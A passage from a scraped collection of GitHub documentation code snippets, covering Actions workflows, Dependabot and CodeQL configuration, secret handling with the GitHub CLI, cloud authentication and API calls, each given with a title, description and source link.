(YAML)\nDESCRIPTION: This snippet demonstrates how to enable dependency caching for the CodeQL action by setting the `dependency-caching` option to `true`. This improves the speed of subsequent scans by reusing previously cached dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/code-scanning/creating-an-advanced-setup-for-code-scanning/codeql-code-scanning-for-compiled-languages.md#_snippet_1\n\nLANGUAGE: YAML\nCODE:\n```\n    # Initializes CodeQL with dependency caching enabled\n    - name: Initialize CodeQL\n      uses: {% data reusables.actions.action-codeql-action-init %}\n      with:\n        languages: java\n        dependency-caching: true\n```\n\n----------------------------------------\n\nTITLE: Listing Helm Releases\nDESCRIPTION: This code snippet demonstrates how to list Helm releases in all namespaces. It's used to verify the installation of ARC and the runner scale set.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/quickstart-for-actions-runner-controller.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nhelm list -A\n```\n\n----------------------------------------\n\nTITLE: Initializing Octokit.js\nDESCRIPTION: This code snippet demonstrates how to create an instance of Octokit.js with an authentication token.  Optionally, it includes setting the base URL when using GitHub Enterprise Server. Replace `YOUR-TOKEN` with your actual GitHub token and `{% data variables.product.rest_url %}` with the appropriate URL for your GHES instance.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nconst octokit = new Octokit({ {% ifversion ghes %}\n  baseUrl: \"{% data variables.product.rest_url %}\",{% endif %}\n  auth: 'YOUR-TOKEN'\n});\n```\n\n----------------------------------------\n\nTITLE: Configure Private Docker Registry for Dependabot in YAML\nDESCRIPTION: This snippet demonstrates how to configure Dependabot to access a private Docker registry using the `registries` section in `dependabot.yml`. It defines a registry named `dockerhub` with the necessary authentication details (username and password) and references it in the `updates` section to allow version updates for dependencies in that registry. The password is retrieved from GitHub secrets for secure storage.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/dependabot-options-reference.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n# Minimal settings to update dependencies stored in one private registry\n\nversion: 2\nregistries:\n  dockerhub: # Define access for a private registry\n    type: docker-registry\n    url: registry.hub.docker.com\n    username: octocat\n    password: ${{secrets.DOCKERHUB_PASSWORD}}\nupdates:\n  - package-ecosystem: \"docker\"\n    directory: \"/docker-registry/dockerhub\"\n    registries:\n      - dockerhub # Allow version updates for dependencies in this registry\n    schedule:\n      interval: \"monthly\"\n```\n\n----------------------------------------\n\nTITLE: Using External Actions in Composite Actions (YAML)\nDESCRIPTION: This snippet demonstrates how to use external actions within a composite action in GitHub Actions. It shows various ways to reference actions, including specifying a commit SHA, a major release version, a specific version, a branch, a subdirectory, a local action, and Docker images (public registry and Docker Hub).\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nruns:\n  using: \"composite\"\n  steps:\n    # Reference a specific commit\n    - uses: actions/checkout@8f4b7f84864484a7bf31766abe9204da3cbe65b3\n    # Reference the major version of a release\n    - uses: {% data reusables.actions.action-checkout %}\n    # Reference a specific version\n    - uses: {% data reusables.actions.action-checkout %}.2.0\n    # Reference a branch\n    - uses: actions/checkout@main\n    # References a subdirectory in a public GitHub repository at a specific branch, ref, or SHA\n    - uses: actions/aws/ec2@main\n    # References a local action\n    - uses: ./.github/actions/my-action\n    # References a docker public registry action\n    - uses: docker://gcr.io/cloud-builders/gradle\n    # Reference a docker image published on docker hub\n    - uses: docker://alpine:3.8\n```\n\n----------------------------------------\n\nTITLE: Conditional Environment Variable Workflow in YAML\nDESCRIPTION: This YAML snippet demonstrates how to define and use environment variables within a GitHub Actions workflow, including a conditional step that utilizes the `env` context to determine whether the step should be executed. The workflow triggers on `workflow_dispatch` and includes a job with a conditional step that prints a greeting if the `DAY_OF_WEEK` environment variable is set to 'Monday'.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nname: Conditional env variable\n\non: workflow_dispatch\n\nenv:\n  DAY_OF_WEEK: Monday\n\njobs:\n  greeting_job:\n    runs-on: ubuntu-latest\n    env:\n      Greeting: Hello\n    steps:\n      - name: \"Say Hello Mona it's Monday\"\n        if: ${{ env.DAY_OF_WEEK == 'Monday' }}\n        run: echo \"$Greeting $First_Name. Today is $DAY_OF_WEEK!\"\n        env:\n          First_Name: Mona\n```\n\n----------------------------------------\n\nTITLE: Installing a local GitHub CLI extension\nDESCRIPTION: This shell command installs a GitHub CLI extension from the current directory. It leverages the `gh extension install` command, pointing to the current directory (`.`) as the extension source. The extension's files must be present in the current directory.\nSOURCE: https://github.com/github/docs/blob/main/content/github-cli/github-cli/creating-github-cli-extensions.md#_snippet_13\n\nLANGUAGE: Shell\nCODE:\n```\ngh extension install .\n```\n\n----------------------------------------\n\nTITLE: Trigger Workflow on Check Suite Completion - YAML\nDESCRIPTION: This snippet configures a workflow to run when a check suite is completed. It specifies the `check_suite` event and the `completed` activity type. The workflow will trigger when check suite activity occurs, where a check suite is a collection of check runs created for a specific commit.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  check_suite:\n    types: [completed]\n```\n\n----------------------------------------\n\nTITLE: Setting image description in GitHub Actions workflow\nDESCRIPTION: This YAML snippet demonstrates how to build and push a multi-arch image using GitHub Actions and set the image description. The `outputs` parameter of the `docker/build-push-action` is used to set the `org.opencontainers.image.description` annotation for the image index.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-container-registry.md#_snippet_14\n\nLANGUAGE: yaml\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n- name: Build and push Docker image\n  uses: docker/build-push-action@f2a1d5e99d037542a71f64918e516c093c6f3fc4\n  with:\n    context: .\n    file: ./Dockerfile\n    platforms: {% raw %}${{ matrix.platforms }}{% endraw %}\n    push: true\n    outputs: type=image,name=target,annotation-index.org.opencontainers.image.description=My multi-arch image\n```\n\n----------------------------------------\n\nTITLE: Azure Login with OIDC Workflow - YAML\nDESCRIPTION: This workflow demonstrates how to use the `azure/login` action to authenticate to Azure using OpenID Connect (OIDC). It configures the necessary permissions, retrieves secrets for Azure client ID, tenant ID, and subscription ID, and then uses the `azure/login` action to obtain an access token. The workflow then executes Azure CLI commands to verify the authentication and list Azure resource groups.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-azure.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nname: Run Azure Login with OIDC\non: [push]\n\npermissions:\n  id-token: write\n  contents: read\njobs:\n  build-and-deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - name: 'Az CLI login'\n        uses: azure/login@a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0\n        with:\n          client-id: ${{ secrets.AZURE_CLIENT_ID }}\n          tenant-id: ${{ secrets.AZURE_TENANT_ID }}\n          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}\n\n      - name: 'Run az commands'\n        run: |\n          az account show\n          az group list\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies with npm ci\nDESCRIPTION: This example demonstrates how to install dependencies using `npm ci`. It ensures that the dependencies defined in `package-lock.json` or `npm-shrinkwrap.json` are installed without updating the lock file. This method is faster and more reliable than `npm install`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-nodejs.md#_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\nsteps:\n- uses: {% data reusables.actions.action-checkout %}\n- name: Use Node.js\n  uses: {% data reusables.actions.action-setup-node %}\n  with:\n    node-version: '20.x'\n- name: Install dependencies\n  run: npm ci\n```\n\n----------------------------------------\n\nTITLE: Passing Secrets to Nested Workflows - Specific Secret\nDESCRIPTION: This YAML snippet illustrates passing a specific secret from a calling workflow to a called workflow.  It uses the `secrets` key and the `${{ secrets.secret_name }}` syntax to explicitly define which secrets are passed.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/reusing-workflows.md#_snippet_8\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  workflowB-calls-workflowC:\n    uses: different-org/example-repo/.github/workflows/C.yml@main\n    secrets:\n      repo-token: ${{ secrets.personal_access_token }} # pass just this secret\n```\n\n----------------------------------------\n\nTITLE: Setting a GitHub secret from a file\nDESCRIPTION: This command uses the `gh` CLI to set a GitHub secret named `CERTIFICATE_BASE64` with the contents of the `cert.base64` file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_21\n\nLANGUAGE: shell\nCODE:\n```\n$ gh secret set CERTIFICATE_BASE64 < cert.base64\n```\n\n----------------------------------------\n\nTITLE: Adding IAM Policy Bindings with gcloud\nDESCRIPTION: These commands add IAM policy bindings to a Google Cloud project using the `gcloud projects add-iam-policy-binding` command.  They grant the specified service account roles such as `container.admin`, `storage.admin` and `container.clusterViewer` within the project. The project ID is provided by the `$GKE_PROJECT` variable, and the service account email by `$SA_EMAIL`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-to-google-kubernetes-engine.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\ngcloud projects add-iam-policy-binding $GKE_PROJECT \\\n \t --member=serviceAccount:$SA_EMAIL \\\n \t --role=roles/container.admin\ngcloud projects add-iam-policy-binding $GKE_PROJECT \\\n \t --member=serviceAccount:$SA_EMAIL \\\n \t --role=roles/storage.admin\ngcloud projects add-iam-policy-binding $GKE_PROJECT \\\n \t --member=serviceAccount:$SA_EMAIL \\\n \t --role=roles/container.clusterViewer\n```\n\n----------------------------------------\n\nTITLE: Adding a table using Markdown\nDESCRIPTION: This snippet shows how to create a table in Markdown to organize information in your profile README. It includes an example table structure with a header row and data rows. It utilizes the `:---` syntax for right-aligning numeric columns.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/quickstart-for-writing-on-github.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n| Rank | THING-TO-RANK |\n|-----:|---------------|\n|     1|               |\n|     2|               |\n|     3|               |\n```\n\n----------------------------------------\n\nTITLE: Passing Secrets to Nested Workflows - Inherit\nDESCRIPTION: This YAML snippet shows how to pass all secrets from a calling workflow to a directly called workflow using the `inherit` keyword. The `secrets: inherit` configuration ensures that all secrets available to the calling workflow are also available to the called workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/reusing-workflows.md#_snippet_7\n\nLANGUAGE: YAML\nCODE:\n```\njobs:\n  workflowA-calls-workflowB:\n    uses: octo-org/example-repo/.github/workflows/B.yml@main\n    secrets: inherit # pass all secrets\n```\n\n----------------------------------------\n\nTITLE: Using `inputs` context in Reusable Workflow YAML\nDESCRIPTION: This YAML snippet demonstrates the use of the `inputs` context in a reusable workflow triggered by `workflow_call`. It defines input parameters `build_id`, `deploy_target`, and `perform_deploy` and uses them in the `deploy` job.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/accessing-contextual-information-about-workflow-runs.md#_snippet_23\n\nLANGUAGE: yaml\nCODE:\n```\nname: Reusable deploy workflow\non:\n  workflow_call:\n    inputs:\n      build_id:\n        required: true\n        type: number\n      deploy_target:\n        required: true\n        type: string\n      perform_deploy:\n        required: true\n        type: boolean\n\njobs:\n  deploy:\n    runs-on: ubuntu-latest\n    if: ${{ inputs.perform_deploy }}\n    steps:\n      - name: Deploy build to target\n        run: echo \"Deploying build:${{ inputs.build_id }} to target:${{ inputs.deploy_target }}\"\n```\n\n----------------------------------------\n\nTITLE: Example: Setting and Using Environment Variable in Bash\nDESCRIPTION: This YAML configuration defines two steps to demonstrate setting and using an environment variable in Bash. The first step sets `action_state` to `yellow` by appending to `$GITHUB_ENV`. The second step reads and prints the value of `action_state`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-what-your-workflow-does/workflow-commands-for-github-actions.md#_snippet_34\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Set the value\n    id: step_one\n    run: |\n      echo \"action_state=yellow\" >> \"$GITHUB_ENV\"\n  - name: Use the value\n    id: step_two\n    run: |\n      printf '%s\\n' \"$action_state\" # This will output 'yellow'\n\n```\n\n----------------------------------------\n\nTITLE: Configuring JWT Auth in HashiCorp Vault (Shell)\nDESCRIPTION: This command configures the JWT authentication method in HashiCorp Vault, specifying the issuer URL for verifying JWTs.  The `bound_issuer` and `oidc_discovery_url` parameters are set to either `https://HOSTNAME/_services/token` (for GHES) or `https://token.actions.githubusercontent.com` (for GHES/GHEC).\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-hashicorp-vault.md#_snippet_1\n\nLANGUAGE: shell\nCODE:\n```\nvault write auth/jwt/config \\\n  bound_issuer=\"{% ifversion ghes %}https://HOSTNAME/_services/token{% else %}https://token.actions.githubusercontent.com{% endif %}\" \\\n  oidc_discovery_url=\"{% ifversion ghes %}https://HOSTNAME/_services/token{% else %}https://token.actions.githubusercontent.com{% endif %}\"\n```\n\n----------------------------------------\n\nTITLE: Swift Workflow Template (GHES)\nDESCRIPTION: This workflow configuration defines a CI pipeline for Swift projects. It triggers on push and pull requests to the `main` branch, runs on the `macos-latest` runner, checks out the code, builds the Swift project using `swift build -v`, and runs tests using `swift test -v`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/building-and-testing/building-and-testing-swift.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Swift\n\non:\n  push:\n    branches: [ \"main\" ]\n  pull_request:\n    branches: [ \"main\" ]\n\njobs:\n  build:\n    runs-on: macos-latest\n\n    steps:\n    - uses: {% data reusables.actions.action-checkout %}\n    - name: Build\n      run: swift build -v\n    - name: Run tests\n      run: swift test -v\n```\n\n----------------------------------------\n\nTITLE: Custom Transformer for Build Step (Ruby)\nDESCRIPTION: This Ruby code snippet defines a custom transformer that converts a build step with the identifier \"buildJavaScriptApp\" to a GitHub Actions workflow step that executes multiple `npm` commands. The `transform` method is used to define the conversion logic.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/extending-github-actions-importer-with-custom-transformers.md#_snippet_1\n\nLANGUAGE: ruby\nCODE:\n```\ntransform \"buildJavaScriptApp\" do |item|\n  command = [\"build\", \"package\", \"deploy\"].map do |script|\n    \"npm run #{script}\"\n  end\n\n  {\n    name: \"build javascript app\",\n    run: command.join(\"\\n\")\n  }\nend\n```\n\n----------------------------------------\n\nTITLE: Querying GraphQL with curl\nDESCRIPTION: This snippet demonstrates how to query the GraphQL API using `curl`. It makes a `POST` request to the GraphQL endpoint with a JSON payload containing the GraphQL query.  The `Authorization` header is required for authentication and the query itself is wrapped in a JSON structure under the `query` key. Newline characters in the query string need to be escaped.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/forming-calls-with-graphql.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Authorization: bearer TOKEN\" -X POST -d \" \\\n { \\\n   \\\"query\\\": \\\"query { viewer { login }}\\\" \\\n } \\\n\" {% data variables.product.graphql_url %}\n```\n\n----------------------------------------\n\nTITLE: Setting organization secret with visibility via GitHub CLI\nDESCRIPTION: This snippet demonstrates how to set an organization secret with the `--visibility` flag. This example makes the secret available to all repositories within the organization. Requires GitHub CLI and `admin:org` scope.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions.md#_snippet_7\n\nLANGUAGE: shell\nCODE:\n```\ngh secret set --org ORG_NAME SECRET_NAME --visibility all\n```\n\n----------------------------------------\n\nTITLE: Print GitHub Event Context - YAML\nDESCRIPTION: This workflow demonstrates how to print the entire `github.event` context to the console. It is useful for inspecting the available properties for a specific event that triggered the workflow. The workflow runs on ubuntu-latest and uses the `toJSON` function to convert the context to a JSON string before printing it.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/triggering-a-workflow.md#_snippet_2\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  print_context:\n    runs-on: ubuntu-latest\n    steps:\n      - env:\n          EVENT_CONTEXT: {% raw %}${{ toJSON(github.event) }}{% endraw %}\n        run: |\n          echo $EVENT_CONTEXT\n```\n\n----------------------------------------\n\nTITLE: Defining Workflow Run Name\nDESCRIPTION: This YAML snippet shows how to define a `run-name` for a workflow, using expressions to include dynamic values from the `inputs` and `github` contexts. It displays the deploy target and the actor who initiated the deployment.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nrun-name: Deploy to ${{ inputs.deploy_target }} by @${{ github.actor }}\n```\n\n----------------------------------------\n\nTITLE: Example Caller Workflow Definition - YAML\nDESCRIPTION: This snippet demonstrates a caller workflow that calls two reusable workflows. It shows how to call a workflow without passing data (`workflow-A.yml`) and how to call a workflow with inputs and secrets (`workflow-B.yml`).  It also shows how to specify permissions for the job that calls the reusable workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/reusing-workflows.md#_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\nname: Call a reusable workflow\n\non:\n  pull_request:\n    branches:\n      - main\n\njobs:\n  call-workflow:\n    uses: octo-org/example-repo/.github/workflows/workflow-A.yml@v1\n\n  call-workflow-passing-data:\n    permissions:\n      contents: read\n      pull-requests: write\n    uses: octo-org/example-repo/.github/workflows/workflow-B.yml@main\n    with:\n      config-path: .github/labeler.yml\n    secrets:\n      token: ${{ secrets.GITHUB_TOKEN }}\n```\n\n----------------------------------------\n\nTITLE: Docker Container Action with Local Dockerfile (YAML)\nDESCRIPTION: This snippet configures a GitHub Action to run inside a Docker container using a local `Dockerfile`. It specifies that the action is using Docker and points to the `Dockerfile` located in the repository. The file must be named `Dockerfile` and the path must be relative to the action metadata file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/creating-actions/metadata-syntax-for-github-actions.md#_snippet_11\n\nLANGUAGE: yaml\nCODE:\n```\nruns:\n  using: 'docker'\n  image: 'Dockerfile'\n```\n\n----------------------------------------\n\nTITLE: Adding an upstream remote repository using Git\nDESCRIPTION: Adds a new remote repository named 'upstream' pointing to the original repository from which the fork was created.  This enables syncing changes from the original repository to the fork.\nSOURCE: https://github.com/github/docs/blob/main/content/pull-requests/collaborating-with-pull-requests/working-with-forks/configuring-a-remote-repository-for-a-fork.md#_snippet_1\n\nLANGUAGE: Shell\nCODE:\n```\ngit remote add upstream https://{% data variables.product.product_url %}/ORIGINAL-OWNER/ORIGINAL-REPOSITORY.git\n```\n\n----------------------------------------\n\nTITLE: Fetching Dependabot Metadata with GitHub Actions (YAML)\nDESCRIPTION: This workflow fetches metadata about a Dependabot pull request, such as dependency names, dependency type, and update type. It uses the `dependabot/fetch-metadata` action to retrieve the metadata and makes it available as outputs. The workflow is triggered on pull requests created by Dependabot.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/dependabot/working-with-dependabot/automating-dependabot-with-github-actions.md#_snippet_0\n\nLANGUAGE: YAML\nCODE:\n```\nname: Dependabot fetch metadata\non: pull_request\n\npermissions:\n  pull-requests: write\n  issues: write\n\njobs:\n  dependabot:\n    runs-on: ubuntu-latest\n    if: github.event.pull_request.user.login == 'dependabot[bot]' && github.repository == 'owner/my_repo'\n    steps:\n      - name: Dependabot metadata\n        id: metadata\n        uses: dependabot/fetch-metadata@d7267f607e9d3fb96fc2fbe83e0af444713e90b7\n        with:\n          github-token: \"${{ secrets.GITHUB_TOKEN }}\"\n      # The following properties are now available:\n      #  - steps.metadata.outputs.dependency-names\n      #  - steps.metadata.outputs.dependency-type\n      #  - steps.metadata.outputs.update-type\n```\n\n----------------------------------------\n\nTITLE: Displaying Dollar Signs Within Math Expressions\nDESCRIPTION: This snippet demonstrates how to display a dollar sign as a character within a mathematical expression.  It uses a backslash (`\\`) before the dollar sign to escape it.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/writing-mathematical-expressions.md#_snippet_4\n\nLANGUAGE: text\nCODE:\n```\nThis expression uses `\\$` to display a dollar sign: $`\\sqrt{\\$4}`$\n```\n\n----------------------------------------\n\nTITLE: Configuring Content Exclusions Example in YAML\nDESCRIPTION: This YAML snippet provides examples of how to specify paths to exclude in the repository settings to prevent GitHub Copilot from accessing them. It demonstrates how to exclude specific files, files with certain names anywhere in the repository, files with names matching a pattern, and all files in a directory or its subdirectories.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/managing-copilot/configuring-and-auditing-content-exclusion/excluding-content-from-github-copilot.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n# Ignore the `/src/some-dir/kernel.rs` file in this repository.\n- \"/src/some-dir/kernel.rs\"\n\n# Ignore files called `secrets.json` anywhere in this repository.\n- \"secrets.json\"\n\n# Ignore all files whose names begin with `secret` anywhere in this repository.\n- \"secret*\"\n\n# Ignore files whose names end with `.cfg` anywhere in this repository.\n- \"*.cfg\"\n\n# Ignore all files in or below the `/scripts` directory of this repository.\n- \"/scripts/**\"\n```\n\n----------------------------------------\n\nTITLE: Defining CI Environment Variables in GitHub Actions\nDESCRIPTION: This snippet defines environment variables related to a pull request's source and target repositories and branches within a GitHub Actions workflow. It utilizes GitHub's event context to extract information about the pull request. These variables can be used to access repository names, branch names, and commit SHAs.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-gitlab-with-github-actions-importer.md#_snippet_74\n\nLANGUAGE: YAML\nCODE:\n```\n| `CI_EXTERNAL_PULL_REQUEST_SOURCE_REPOSITORY`  | {% raw %}`${{ github.event.pull_request.head.repo.full_name }}`{% endraw %}                                |\n| `CI_EXTERNAL_PULL_REQUEST_TARGET_REPOSITORY`  | {% raw %}`${{ github.event.pull_request.base.repo.full_name }}`{% endraw %}                                |\n| `CI_EXTERNAL_PULL_REQUEST_SOURCE_BRANCH_NAME` | {% raw %}`${{ github.event.pull_request.head.ref }}`{% endraw %}                                           |\n| `CI_EXTERNAL_PULL_REQUEST_SOURCE_BRANCH_SHA`  | {% raw %}`${{ github.event.pull_request.head.sha }}`{% endraw %}                                           |\n| `CI_EXTERNAL_PULL_REQUEST_TARGET_BRANCH_NAME` | {% raw %}`${{ github.event.pull_request.base.ref }}`{% endraw %}                                           |\n| `CI_EXTERNAL_PULL_REQUEST_TARGET_BRANCH_SHA`  | {% raw %}`${{ github.event.pull_request.base.sha }}`{% endraw %}                                           |\n```\n\n----------------------------------------\n\nTITLE: Build and Deploy Java JAR to Azure Web App (GitHub Actions)\nDESCRIPTION: This workflow builds a Java project with Maven and deploys it to Azure App Service. It triggers on pushes to the `main` branch, sets up the Java version, builds the project, uploads the artifact, and then deploys it to Azure using the Azure Web Apps Deploy action. Ensure `AZURE_WEBAPP_NAME` and `AZURE_WEBAPP_PUBLISH_PROFILE` are configured correctly.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/deploying-java-to-azure-app-service.md#_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Build and deploy JAR app to Azure Web App\n\nenv:\n  AZURE_WEBAPP_NAME: MY_WEBAPP_NAME   # set this to your application's name\n  JAVA_VERSION: '11'                  # set this to the Java version to use\n\non:\n  push:\n    branches:\n      - main\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n\n      - name: Set up Java version\n        uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: {% raw %}${{ env.JAVA_VERSION }}{% endraw %}\n          cache: 'maven'\n\n      - name: Build with Maven\n        run: mvn clean install\n\n      - name: Upload artifact for deployment job\n        uses: {% data reusables.actions.action-upload-artifact %}\n        with:\n          name: java-app\n          path: '{% raw %}${{ github.workspace }}{% endraw %}/target/*.jar'\n\n  deploy:\n    runs-on: ubuntu-latest\n    needs: build\n    environment:\n      name: 'production'\n      url: {% raw %}${{ steps.deploy-to-webapp.outputs.webapp-url }}{% endraw %}\n\n    steps:\n      - name: Download artifact from build job\n        uses: {% data reusables.actions.action-download-artifact %}\n        with:\n          name: java-app\n\n      - name: Deploy to Azure Web App\n        id: deploy-to-webapp\n        uses: azure/webapps-deploy@85270a1854658d167ab239bce43949edb336fa7c\n        with:\n          app-name: {% raw %}${{ env.AZURE_WEBAPP_NAME }}{% endraw %}\n          publish-profile: {% raw %}${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}{% endraw %}\n          package: '*.jar'\n```\n\n----------------------------------------\n\nTITLE: Dry run using config file\nDESCRIPTION: This command performs a dry run migration from CircleCI to GitHub Actions using a specified YAML configuration file to locate source files.  It uses the repository slug from the config file to match the `--circle-ci-organization` and `--circle-ci-project` options, then uses the path to find the source file.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-circleci-with-github-actions-importer.md#_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\ngh actions-importer dry-run circle-ci --circle-ci-project circle-org-name/circle-project-name --output-dir ./output/ --config-file-path ./path/to/circle-ci/config.yml\n```\n\n----------------------------------------\n\nTITLE: Cron Syntax Explanation\nDESCRIPTION: This text snippet explains the structure of cron syntax used for scheduling workflows. It details the five fields representing minute, hour, day of the month, month, and day of the week.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/choosing-when-your-workflow-runs/events-that-trigger-workflows.md#_snippet_47\n\nLANGUAGE: text\nCODE:\n```\n┌───────────── minute (0 - 59)\n│ ┌───────────── hour (0 - 23)\n│ │ ┌───────────── day of the month (1 - 31)\n│ │ │ ┌───────────── month (1 - 12 or JAN-DEC)\n│ │ │ │ ┌───────────── day of the week (0 - 6 or SUN-SAT)\n│ │ │ │ │\n│ │ │ │ │\n│ │ │ │ │\n* * * * *\n```\n\n----------------------------------------\n\nTITLE: Overriding Docker `ENTRYPOINT` using `jobs.<job_id>.steps[*].with.entrypoint`\nDESCRIPTION: This YAML snippet illustrates how to override the Docker `ENTRYPOINT` in a `Dockerfile` or set one if it wasn't already specified using the `jobs.<job_id>.steps[*].with.entrypoint` syntax. It defines a custom executable to be run instead of the default `ENTRYPOINT`.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/writing-workflows/workflow-syntax-for-github-actions.md#_snippet_28\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n  - name: Run a custom command\n    uses: octo-org/action-name@main\n    with:\n      entrypoint: /a/different/executable\n```\n\n----------------------------------------\n\nTITLE: Handling GitHub Webhook Events (Ruby)\nDESCRIPTION: This snippet defines the `/event_handler` route to process incoming GitHub webhook events. It authenticates the app and installation, retrieves the payload, verifies the webhook signature, and then uses a `case` statement to handle different event types like `check_suite` and `check_run`.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-ci-checks-with-a-github-app.md#_snippet_46\n\nLANGUAGE: Ruby\nCODE:\n```\n  # Executed before each request to the `/event_handler` route\n  before '/event_handler' do\n    get_payload_request(request)\n    verify_webhook_signature\n\n    # If a repository name is provided in the webhook, validate that\n    # it consists only of latin alphabetic characters, `-`, and `_`.\n    unless @payload['repository'].nil?\n      halt 400 if (@payload['repository']['name'] =~ /[0-9A-Za-z\\-\\_]+/).nil?\n    end\n\n    authenticate_app\n    # Authenticate the app installation in order to run API operations\n    authenticate_installation(@payload)\n  end\n\n  post '/event_handler' do\n\n    # Get the event type from the HTTP_X_GITHUB_EVENT header\n    case request.env['HTTP_X_GITHUB_EVENT']\n\n    when 'check_suite'\n      # A new check_suite has been created. Create a new check run with status queued\n      if @payload['action'] == 'requested' || @payload['action'] == 'rerequested'\n        create_check_run\n      end\n\n    when 'check_run'\n      # Check that the event is being sent to this app\n      if @payload['check_run']['app']['id'].to_s === APP_IDENTIFIER\n        case @payload['action']\n        when 'created'\n          initiate_check_run\n        when 'rerequested'\n          create_check_run\n        when 'requested_action'\n          take_requested_action\n        end\n      end\n    end\n\n    200 # success status\n  end\n```\n\n----------------------------------------\n\nTITLE: Defining Reusable Workflow Trigger - YAML\nDESCRIPTION: This snippet shows how to define the `workflow_call` event in a reusable workflow.  This trigger is required for a workflow to be called by another workflow. No dependencies are needed.  The `on` key specifies the event that triggers the workflow.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/sharing-automations/reusing-workflows.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\non:\n  workflow_call:\n```\n\n----------------------------------------\n\nTITLE: Dry-run Migration of GitLab Pipeline\nDESCRIPTION: This command performs a dry-run migration of a GitLab pipeline to a GitHub Actions workflow. It converts the pipeline and creates output files in a specified directory, without opening a pull request. Requires specifying the GitLab project slug and namespace.\nSOURCE: 